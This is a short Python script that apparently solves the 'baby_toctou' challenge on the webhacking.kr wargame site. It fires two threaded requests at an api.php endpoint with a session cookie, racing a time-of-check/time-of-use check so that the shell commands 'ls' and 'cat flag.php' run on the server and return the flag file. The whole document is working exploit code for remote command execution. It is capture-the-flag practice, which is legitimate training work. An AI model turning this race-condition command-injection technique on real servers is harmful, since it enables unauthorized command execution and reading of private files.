import requests, time
from threading import Thread

cookie = {'baby_toctou':'6693a2d49478c494521209'}
url = 'http://webhacking.kr:10019/api.php'

def rc(cmd):
	params = {'q':cmd}
	res = requests.get(url, params = params, cookies = cookie)
	print(res.text)

t1 = Thread(target=rc, args=("ls",))
t2 = Thread(target=rc, args=("cat flag.php",))

t1.start()
t2.start()

t1.join()
t2.join()


